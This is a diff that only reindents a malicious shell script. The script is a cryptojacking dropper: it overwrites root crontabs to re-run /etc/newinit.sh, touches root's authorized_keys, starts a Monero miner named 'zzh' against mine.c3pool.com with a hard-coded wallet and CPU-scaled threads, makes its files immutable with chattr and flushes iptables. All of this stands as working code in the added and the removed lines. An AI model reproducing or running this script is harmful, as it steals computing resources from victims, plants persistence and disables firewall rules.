@@ -687,7 +687,7 @@ lock_cron()
 
 
 if [ -f "$rtdir" ]
-then
+	then
         echo "i am root"
         mkdir -p /root/.ssh
         echo "goto 1" >> /etc/zzhs
@@ -742,15 +742,15 @@ then
 	    yum -y remove e2fsprogs
             yum -y install e2fsprogs
     fi
-			unlock_cron
-                        rm -f ${crondir}
-                        rm -f /etc/cron.d/zzh
-                        rm -f /etc/crontab
-			echo "*/30 * * * * sh /etc/newinit.sh >/dev/null 2>&1" >> ${crondir}
-			echo "*/40 * * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/cron.d/zzh
-			echo "0 1 * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/crontab
-                        echo crontab created
-			lock_cron
+		unlock_cron
+		rm -f ${crondir}
+		rm -f /etc/cron.d/zzh
+		rm -f /etc/crontab
+		echo "*/30 * * * * sh /etc/newinit.sh >/dev/null 2>&1" >> ${crondir}
+		echo "*/40 * * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/cron.d/zzh
+		echo "0 1 * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/crontab
+		echo crontab created
+		lock_cron
         chmod 700 /root/.ssh/
         echo >> /root/.ssh/authorized_keys
         chmod 600 /root/.ssh/authorized_keys
@@ -791,35 +791,35 @@ then
     fi
     if [ $? -ne 0 ]
     then
-                cd /etc
-                echo "not root runing"
-                sleep 5s
-                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`
-if  (("$cpunum"<=2 )); then
-      cpunum=1
-      echo $cpunum
-elif (("$cpunum"<=4)); then
-      cpunum=2
-      echo $cpunum
-elif (("$cpunum"<=8)); then
-      cpunum=4
-      echo $cpunum
-elif (("$cpunum"<=16)); then
-      cpunum=8
-      echo $cpunum
-elif (("$cpunum"<=32)); then
-      cpunum=16
-      echo $cpunum
-elif (("$cpunum"<=64)); then
-      cpunum=32
-      echo $cpunum
-elif (("$cpunum">64)); then
-      cpunum=50
-      echo $cpunum
-else
-      cpunum=1
-fi
-                ./zzh -B --log-file=/etc/etc --coin=monero -o mine.c3pool.com:13333 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99 -p x &
+		cd /etc
+		echo "not root runing"
+		sleep 5s
+		cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`
+		if  (("$cpunum"<=2 )); then
+			  cpunum=1
+			  echo $cpunum
+		elif (("$cpunum"<=4)); then
+			  cpunum=2
+			  echo $cpunum
+		elif (("$cpunum"<=8)); then
+			  cpunum=4
+			  echo $cpunum
+		elif (("$cpunum"<=16)); then
+			  cpunum=8
+			  echo $cpunum
+		elif (("$cpunum"<=32)); then
+			  cpunum=16
+			  echo $cpunum
+		elif (("$cpunum"<=64)); then
+			  cpunum=32
+			  echo $cpunum
+		elif (("$cpunum">64)); then
+			  cpunum=50
+			  echo $cpunum
+		else
+			  cpunum=1
+		fi
+		./zzh -B --log-file=/etc/etc --coin=monero -o mine.c3pool.com:13333 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99 -p x &
     else
                 echo "root runing....."
     fi
@@ -868,45 +868,43 @@ else
     ps -fe|grep zzh |grep -v grep
         if [ $? -ne 0 ]
             then
-                echo "not tmp runing"
-                cd /tmp
-                chmod 777 zzh
-                sleep 5s
-                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`
-if  (("$cpunum"<=2 )); then
-      cpunum=1
-      echo $cpunum
-elif (("$cpunum"<=4)); then
-      cpunum=2
-      echo $cpunum
-elif (("$cpunum"<=8)); then
-      cpunum=4
-      echo $cpunum
-elif (("$cpunum"<=16)); then
-      cpunum=8
-      echo $cpunum
-elif (("$cpunum"<=32)); then
-      cpunum=16
-      echo $cpunum
-elif (("$cpunum"<=64)); then
-      cpunum=32
-      echo $cpunum
-elif (("$cpunum">64)); then
-      cpunum=50
-      echo $cpunum
-else 
-      echo other   
-fi
+			echo "not tmp runing"
+			cd /tmp
+			chmod 777 zzh
+			sleep 5s
+			cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`
+			if  (("$cpunum"<=2 )); then
+				  cpunum=1
+				  echo $cpunum
+			elif (("$cpunum"<=4)); then
+				  cpunum=2
+				  echo $cpunum
+			elif (("$cpunum"<=8)); then
+				  cpunum=4
+				  echo $cpunum
+			elif (("$cpunum"<=16)); then
+				  cpunum=8
+				  echo $cpunum
+			elif (("$cpunum"<=32)); then
+				  cpunum=16
+				  echo $cpunum
+			elif (("$cpunum"<=64)); then
+				  cpunum=32
+				  echo $cpunum
+			elif (("$cpunum">64)); then
+				  cpunum=50
+				  echo $cpunum
+			else 
+				  echo other   
+			fi
                 ./zzh -B --log-file=/etc/etc --coin=monero -o mine.c3pool.com:13333 --threads=$cpunum -u 4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99 -p x &
-            else
-                echo "tmp runing....."
+		else
+			echo "tmp runing....."
         fi
-
-    chmod 777 /tmp/zzh
-    chattr +i /tmp/zzh
-    chmod 777 /tmp/newinit.sh
-    chattr +i /tmp/newinit.sh
-        
+		chmod 777 /tmp/zzh
+		chattr +i /tmp/zzh
+		chmod 777 /tmp/newinit.sh
+		chattr +i /tmp/newinit.sh
 fi
 
 iptables -F
